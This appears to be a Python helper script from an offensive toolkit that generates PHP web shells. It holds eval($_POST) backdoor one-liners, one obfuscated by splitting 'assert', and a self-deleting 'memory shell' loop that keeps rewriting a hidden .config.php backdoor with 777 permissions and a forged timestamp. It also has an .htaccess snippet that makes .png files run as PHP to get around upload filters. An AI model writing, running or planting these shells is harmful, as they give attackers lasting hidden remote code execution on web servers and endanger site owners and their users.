#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random

memoryShellPHP = '''
<?php

set_time_limit(0);
ignore_user_abort(1);
unlink(__FILE__);
while (1) {
    $name = "%s";
    file_put_contents("./$name", "<?php eval($_POST['$%s'])?>");
    system("chmod 777 $name");
    touch("./$name", mktime(20, 15, 1, 11, 28, 2016));
    usleep(100);
}
'''

# when can not upload php but can upload .htaccess
# and allow rewrite use this one
htaccessRewrite = '''
AddType application/x-httpd-php .png
php_flag engine 1
'''


class Shell(object):

    """
    Generate Shell for use
    """

    def __init__(self, stype):
        super(Shell, self).__init__()
        self.stype = stype
        self.phpShells = [
            "<?php @eval($_POST['$%s'])?>",
            "<?php @eval($GLOBALS['_POST']['%s']);?>",
            # "<?php @eval($_FILE['name']);?>",
            '$k="ass"."ert"; $k(${"_PO"."ST"} ["%s"]);',
        ]

    def basic(self, pwd="a"):
        if self.stype == "php":
            return random.choice(self.phpShells) % pwd
        if self.stype == "bash":
            return "not implement yet"

    def memoryShell(self, shellname=".config.php", pwd="a"):
        return memoryShellPHP % (shellname, pwd)
